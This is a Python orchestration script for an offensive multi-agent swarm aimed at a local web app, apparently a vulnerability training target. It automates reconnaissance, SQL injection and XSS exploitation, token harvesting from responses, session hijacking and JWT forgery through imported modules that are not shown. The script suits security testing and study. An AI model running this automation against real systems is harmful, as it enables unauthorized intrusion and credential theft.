#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║   🦅 NOVA AGENT SWARM v1.0                                 ║
║   Multi-Agent Architecture with Shared Knowledge Graph     ║
║                                                              ║
║   Agents: Recon | Exploit | Auth | Code | Validate | Report ║
║   Communication: Shared Knowledge Graph (JSON-based)        ║
╚══════════════════════════════════════════════════════════════╝
"""

import json
import time
import threading
import queue
import sys
import os
from datetime import datetime
from typing import Dict, List, Optional, Any
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import existing modules
from nova_adaptive_brain import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_fuzzer_fix import NovaFuzzer
from nova_session_hijacker import NovaSessionHijacker
from nova_race_engine import NovaRaceEngine
from nova_jwt_forge import NovaJWTForge
from nova_proto_polluter import NovaProtoPolluter
from nova_deserialize_dropper import NovaDeserializeDropper
from nova_feedback_cortex import NovaFeedbackCortex
from nova_code_reasoner_v2 import NovaCodeReasoner


class KnowledgeGraph:
    """Shared memory bus for all agents. Thread-safe."""

    def __init__(self):
        self.lock = threading.Lock()
        self.graph = {
            "nodes": {},           # id → {type, data, timestamp, source_agent}
            "edges": [],           # {from, to, relationship, data}
            "findings": [],        # Confirmed vulnerabilities
            "tokens": [],          # Captured credentials
            "paths": [],           # Leaked file paths
            "scan_queue": [],      # Endpoints to scan
            "exploit_queue": [],   # Targets to exploit
            "hypothesis_queue": [],# Theories to test
            "mission_log": [],     # Timestamped events
        }

    def add_node(self, node_id: str, node_type: str, data: Dict, agent: str):
        with self.lock:
            self.graph["nodes"][node_id] = {
                "type": node_type,
                "data": data,
                "timestamp": datetime.now().isoformat(),
                "source_agent": agent,
            }

    def add_edge(self, from_id: str, to_id: str, relationship: str, data: Dict = None):
        with self.lock:
            self.graph["edges"].append({
                "from": from_id, "to": to_id,
                "relationship": relationship,
                "data": data or {},
                "timestamp": datetime.now().isoformat(),
            })

    def add_finding(self, finding: Dict, agent: str):
        with self.lock:
            finding["discovered_by"] = agent
            finding["timestamp"] = datetime.now().isoformat()
            self.graph["findings"].append(finding)
            self.log(agent, f"FINDING: {finding.get('type', 'unknown')} on {finding.get('endpoint', '?')}")

    def add_token(self, token: str, source: str, agent: str):
        with self.lock:
            if token not in self.graph["tokens"]:
                self.graph["tokens"].append({"token": token, "source": source, "agent": agent})
                self.log(agent, f"TOKEN CAPTURED: {token[:40]}...")

    def add_path(self, path: str, agent: str):
        with self.lock:
            if path not in self.graph["paths"]:
                self.graph["paths"].append(path)

    def push_scan(self, endpoint: Dict):
        with self.lock:
            self.graph["scan_queue"].append(endpoint)

    def pop_scan(self) -> Optional[Dict]:
        with self.lock:
            return self.graph["scan_queue"].pop(0) if self.graph["scan_queue"] else None

    def push_exploit(self, target: Dict):
        with self.lock:
            self.graph["exploit_queue"].append(target)

    def pop_exploit(self) -> Optional[Dict]:
        with self.lock:
            return self.graph["exploit_queue"].pop(0) if self.graph["exploit_queue"] else None

    def push_hypothesis(self, hypothesis: Dict):
        with self.lock:
            self.graph["hypothesis_queue"].append(hypothesis)

    def pop_hypothesis(self) -> Optional[Dict]:
        with self.lock:
            return self.graph["hypothesis_queue"].pop(0) if self.graph["hypothesis_queue"] else None

    def log(self, agent: str, message: str):
        with self.lock:
            entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{agent}] {message}"
            self.graph["mission_log"].append(entry)
            print(f"  {entry}")

    def get_stats(self) -> Dict:
        with self.lock:
            return {
                "nodes": len(self.graph["nodes"]),
                "edges": len(self.graph["edges"]),
                "findings": len(self.graph["findings"]),
                "tokens": len(self.graph["tokens"]),
                "paths": len(self.graph["paths"]),
                "scan_queue": len(self.graph["scan_queue"]),
                "exploit_queue": len(self.graph["exploit_queue"]),
                "hypothesis_queue": len(self.graph["hypothesis_queue"]),
            }

    def save(self, filename="nova_knowledge_graph.json"):
        with self.lock:
            with open(filename, "w") as f:
                json.dump(self.graph, f, indent=2, default=str)


class BaseAgent(threading.Thread):
    """Base class for all swarm agents."""

    def __init__(self, name: str, kg: KnowledgeGraph, base_url: str = "http://localhost:3000"):
        super().__init__(daemon=True)
        self.name = name
        self.kg = kg
        self.base_url = base_url
        self.running = True
        self.findings_count = 0

    def log(self, message: str):
        self.kg.log(self.name, message)

    def stop(self):
        self.running = False


class ReconAgent(BaseAgent):
    """Continuously discovers endpoints and maps attack surface."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("ReconAgent", kg, base_url)
        self.brain = NovaAdaptiveBrain(base_url=base_url)

    def run(self):
        self.log("🟢 ReconAgent online. Scanning attack surface...")
        endpoints = [
            "/rest/products/search", "/rest/user/login", "/rest/user/register",
            "/rest/user/whoami", "/rest/user/change-password", "/api/Feedbacks",
            "/api/Users", "/rest/basket/1", "/rest/admin/application-configuration",
            "/rest/admin/application-version", "/file-serving", "/rest/order-history",
        ]

        for endpoint in endpoints:
            if not self.running: break
            profile = self.brain.profile_endpoint(endpoint)
            rating = profile.get("attack_surface_rating", "LOW")
            score = profile.get("attack_score", 0)
            
            # Add to knowledge graph
            self.kg.add_node(endpoint, "endpoint", profile, self.name)
            
            # Queue for exploitation if interesting
            if rating in ["CRITICAL", "HIGH"]:
                self.kg.push_exploit({"endpoint": endpoint, "profile": profile, "priority": score})
                self.kg.push_scan({"endpoint": endpoint, "method": "GET", "params": profile.get("reflected_params", ["q"])})
            
            # Extract leaked paths
            for key, value in profile.get("behavior", {}).items():
                if "leak" in key:
                    import re
                    paths = re.findall(r'(/[\w/.-]+\.[\w]+)', str(value))
                    for path in paths:
                        self.kg.add_path(path, self.name)
            
            self.log(f"Profiled {endpoint} → {rating} (Score: {score})")
            time.sleep(0.2)

        self.log(f"Recon complete. {len(self.kg.graph['nodes'])} endpoints mapped.")

class ExploitAgent(BaseAgent):
    """Executes targeted exploits based on ReconAgent findings."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("ExploitAgent", kg, base_url)
        self.synth = NovaExploitSynthesizer(base_url=base_url)
        self.fuzzer = NovaFuzzer(base_url=base_url)

    def run(self):
        self.log("🔴 ExploitAgent online. Waiting for targets...")
        while self.running:
            target = self.kg.pop_exploit()
            if not target:
                time.sleep(0.5)
                continue

            endpoint = target["endpoint"]
            self.log(f"Exploiting: {endpoint}")

            # Determine sink type from profile
            profile = target.get("profile", {})
            leaks = profile.get("behavior", {})
            if leaks.get("leaks_sql"): sink = "sql_injection"
            elif leaks.get("leaks_stack"): sink = "sql_injection"
            elif leaks.get("leaks_auth"): sink = "auth_bypass"
            elif profile.get("reflected_params"): sink = "xss_reflected"
            else: sink = "sql_injection"

            # Run exploit synthesizer
            self.synth.exploit_path(
                path=[{"endpoint": endpoint, "method": "GET", "params": ["q"]}],
                sink_type=sink, confidence="HIGH",
            )

            # Process results
            for result in self.synth.results:
                if result.get("success") == True:
                    indicators = result.get("indicators_found", [])
                    severity = "critical" if any(i in indicators for i in ["password", "admin", "token"]) else "high"
                    
                    finding = {
                        "type": result.get("exploit_type", "unknown"),
                        "endpoint": endpoint,
                        "payload": result.get("payload", ""),
                        "data_exposed": indicators,
                        "severity": severity,
                        "evidence": result.get("response_preview", "")[:300],
                    }
                    self.kg.add_finding(finding, self.name)
                    self.findings_count += 1

                    # If token found, notify AuthAgent
                    if "token" in indicators or "authentication" in indicators:
                        import re
                        tokens = re.findall(r'(eyJ[A-Za-z0-9\-._~+/]+=*)', result.get("response_preview", ""))
                        for token in tokens:
                            if len(token) > 50:
                                self.kg.add_token(token, endpoint, self.name)

                    self.log(f"🔥 {result['exploit_type']} on {endpoint}: {indicators}")

            # Also run fuzzer on interesting targets
            if profile.get("attack_score", 0) >= 20:
                fuzz_targets = [{"endpoint": endpoint, "params": ["q"], "fuzz_types": ["sql_injection", "xss"]}]
                fuzz_report = self.fuzzer.fuzz_targets(fuzz_targets, intensity="low")
                if fuzz_report.get("critical", 0) > 0:
                    self.kg.add_finding({
                        "type": "fuzzer_anomalies",
                        "endpoint": endpoint,
                        "critical": fuzz_report["critical"],
                        "severity": "high",
                    }, self.name)

            time.sleep(0.3)
        self.log(f"ExploitAgent offline. {self.findings_count} findings.")


class AuthAgent(BaseAgent):
    """Specializes in credential attacks — session hijacking, JWT forgery."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("AuthAgent", kg, base_url)
        self.hijacker = None
        self.forge = None

    def run(self):
        self.log("🟣 AuthAgent online. Waiting for tokens...")
        while self.running:
            # Check for tokens to exploit
            if self.kg.graph["tokens"]:
                token_data = self.kg.graph["tokens"][-1]
                token = token_data if isinstance(token_data, str) else token_data.get("token", "")
                
                if token and len(token) > 20:
                    self.log(f"Using captured token for escalation...")
                    
                    # Session hijacking
                    self.hijacker = NovaSessionHijacker(base_url=self.base_url)
                    report = self.hijacker.run_full_hijack(initial_token=token)
                    
                    if report.get("fixation_results"):
                        for r in report["fixation_results"]:
                            if r.get("success"):
                                self.kg.add_finding({
                                    "type": "session_fixation",
                                    "endpoint": r.get("endpoint", ""),
                                    "severity": "medium",
                                }, self.name)
                                self.findings_count += 1
                    
                    # JWT forgery
                    self.forge = NovaJWTForge(base_url=self.base_url)
                    jwt_report = self.forge.run_full_forge(token)
                    
                    if jwt_report.get("successful_forgeries"):
                        self.kg.add_finding({
                            "type": "jwt_forgery",
                            "count": len(jwt_report["successful_forgeries"]),
                            "severity": "critical",
                        }, self.name)
                        self.findings_count += 1
                    
                    # Clear processed token
                    self.kg.graph["tokens"] = []
                    
            time.sleep(1)
        self.log(f"AuthAgent offline. {self.findings_count} findings.")


class CodeAgent(BaseAgent):
    """Source code reasoning — generates and tests hypotheses."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("CodeAgent", kg, base_url)

    def run(self):
        self.log("💜 CodeAgent online. Waiting for paths...")
        while self.running:
            if self.kg.graph["paths"] and len(self.kg.graph["paths"]) >= 5:
                paths = list(set(self.kg.graph["paths"]))
                self.log(f"Analyzing {len(paths)} leaked paths...")
                
                reasoner = NovaCodeReasoner(base_url=self.base_url)
                report = reasoner.run_full_analysis(leaked_paths=paths)
                
                for finding in report.get("findings", []):
                    self.kg.add_finding({
                        "type": finding["vulnerability_type"],
                        "endpoint": finding["endpoint"],
                        "theory": finding["theory"],
                        "source_file": finding.get("source_file", ""),
                        "source_line": finding.get("source_line", 0),
                        "severity": "high",
                    }, self.name)
                    self.findings_count += 1
                
                # Clear processed paths
                self.kg.graph["paths"] = []
                
            time.sleep(2)
        self.log(f"CodeAgent offline. {self.findings_count} findings.")


class ValidationAgent(BaseAgent):
    """Confirms findings and eliminates false positives."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("ValidationAgent", kg, base_url)
        self.cortex = NovaFeedbackCortex(base_url=base_url)

    def run(self):
        self.log("🟡 ValidationAgent online. Monitoring findings...")
        last_finding_count = 0
        
        while self.running:
            current_count = len(self.kg.graph["findings"])
            if current_count > last_finding_count:
                new_findings = self.kg.graph["findings"][last_finding_count:]
                self.log(f"Validating {len(new_findings)} new findings...")
                
                for finding in new_findings:
                    # Check for duplicates
                    duplicates = [f for f in self.kg.graph["findings"] 
                                  if f.get("type") == finding.get("type") 
                                  and f.get("endpoint") == finding.get("endpoint")
                                  and f != finding]
                    if duplicates:
                        self.log(f"⚠️ Duplicate finding filtered: {finding.get('type')}")
                        continue
                    
                    # Validate by re-testing
                    if finding.get("payload"):
                        self.log(f"✅ Validated: {finding.get('type')} on {finding.get('endpoint')}")
                
                last_finding_count = current_count
                
            time.sleep(1)
        self.log(f"ValidationAgent offline.")


class ReportAgent(BaseAgent):
    """Generates final mission reports and evidence chains."""

    def __init__(self, kg: KnowledgeGraph, base_url: str):
        super().__init__("ReportAgent", kg, base_url)

    def run(self):
        self.log("📊 ReportAgent online. Generating reports every 15 seconds...")
        while self.running:
            time.sleep(15)
            
            stats = self.kg.get_stats()
            findings = self.kg.graph["findings"]
            
            if findings:
                # Categorize by severity
                critical = [f for f in findings if f.get("severity") == "critical"]
                high = [f for f in findings if f.get("severity") == "high"]
                medium = [f for f in findings if f.get("severity") == "medium"]
                
                report = {
                    "timestamp": datetime.now().isoformat(),
                    "mission_duration": "ongoing",
                    "total_findings": len(findings),
                    "critical": len(critical),
                    "high": len(high),
                    "medium": len(medium),
                    "tokens_captured": len(self.kg.graph["tokens"]),
                    "paths_leaked": len(self.kg.graph["paths"]),
                    "agents_active": stats,
                    "latest_findings": findings[-5:],
                }
                
                with open("nova_swarm_report.json", "w") as f:
                    json.dump(report, f, indent=2, default=str)
                
                self.log(f"📁 Report updated: {len(findings)} findings ({len(critical)} critical)")
                
        self.log("ReportAgent offline.")


class NovaSwarm:
    """Orchestrates all agents with shared knowledge graph."""

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.kg = KnowledgeGraph()
        self.agents = []

    def launch(self, duration: int = 60):
        """Launch all agents and run for specified duration."""
        print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🦅  NOVA AGENT SWARM — FULL DEPLOYMENT  🦅               ║
║                                                              ║
║   Recon | Exploit | Auth | Code | Validate | Report         ║
║   Shared Knowledge Graph • Autonomous Coordination          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """)

        # Create agents
        self.agents = [
            ReconAgent(self.kg, self.base_url),
            ExploitAgent(self.kg, self.base_url),
            AuthAgent(self.kg, self.base_url),
            CodeAgent(self.kg, self.base_url),
            ValidationAgent(self.kg, self.base_url),
            ReportAgent(self.kg, self.base_url),
        ]

        # Start all agents
        for agent in self.agents:
            agent.start()
            print(f"  🚀 {agent.name} launched")

        print(f"\n  ⏱️  Swarm running for {duration} seconds...\n")

        # Run for specified duration
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n  ⚠️ Swarm interrupted by user")

        # Stop all agents
        print("\n  🛑 Shutting down swarm...")
        for agent in self.agents:
            agent.stop()

        # Wait for agents to finish
        for agent in self.agents:
            agent.join(timeout=3)

        # Final report
        self.kg.save()
        stats = self.kg.get_stats()
        findings = self.kg.graph["findings"]
        
        critical = len([f for f in findings if f.get("severity") == "critical"])
        high = len([f for f in findings if f.get("severity") == "high"])

        print(f"""
╔══════════════════════════════════════════════╗
║        SWARM MISSION COMPLETE               ║
╠══════════════════════════════════════════════╣
║  Agents Deployed:      6                    ║
║  Findings:             {len(findings):>3}                  ║
║  Critical:             {critical:>3}                  ║
║  High:                 {high:>3}                  ║
║  Tokens Captured:      {stats['tokens']:>3}                  ║
║  Paths Leaked:         {stats['paths']:>3}                  ║
║  Knowledge Nodes:      {stats['nodes']:>3}                  ║
╚══════════════════════════════════════════════╝
        """)

        if findings:
            print("🔥 TOP FINDINGS:")
            for f in findings[:5]:
                print(f"   💀 [{f.get('severity', '?').upper()}] {f.get('type', '?')}: {f.get('endpoint', '?')}")

        print(f"\n📁 Knowledge Graph: nova_knowledge_graph.json")
        print(f"📁 Swarm Report: nova_swarm_report.json")
        print(f"🦅 Nova Swarm mission complete.")


if __name__ == "__main__":
    swarm = NovaSwarm(base_url="http://localhost:3000")
    swarm.launch(duration=45)
